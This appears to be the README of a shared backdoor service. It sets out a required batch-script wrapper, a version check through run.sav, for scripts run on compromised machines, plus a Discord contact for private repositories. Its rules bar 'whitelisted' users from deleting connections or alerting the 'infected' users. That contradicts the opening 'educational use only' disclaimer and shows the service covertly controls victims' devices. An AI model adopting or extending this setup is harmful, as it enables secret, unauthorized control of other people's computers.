I would like to remind you that all of this is for **educational use only**

please only use this on devices you own or have **explicit** permission from the device owner

## preset code
all scripts must start with:
```
set number=1
< run.sav (
  set /p number=
)

set update=1
if %number% equ %update% (goto end)
```

all scripts must end with:
```
echo %update% >run.sav
:end
timeout 1 >nul
exit /b
```
change the 1 in where it says
```set update=1```
to anything else every time you update the code
,not doing so will mean your code wont run

## private repositories
to request a private repository conact me through discord (guest257351#1040) to set it up. Private repositories can not be edited by other users. You cannot use the private and public repository at the same time. You will not be able to use backdoors added by other users. Private repositories will be able to be edited, owned, and moderated by me. a Different set of rules will be in the private repository.


# rules:

Failure to follow any of these rules will result in your whitelist being removed

reselling this without permission from me will result in an instant and unappealable termination of your whitelist

using this backdoor to add your own backdoors results in removal of your whitelist

giving someone a copy of the program IS ALLOWED, as long as that person has a whitelist allready

attempting to bypass the whitelist will result in being blacklisted

DELETING ANY OF THESE CONNECTIONS IS AN INSTANT WHITELIST REMOVAL

alerting an infected user that their devices is in person, whether it be in person or through message using the backdoor, your whitelist will be removed

I may terminate your whitelist for any reason I want whether it be on this list or not.
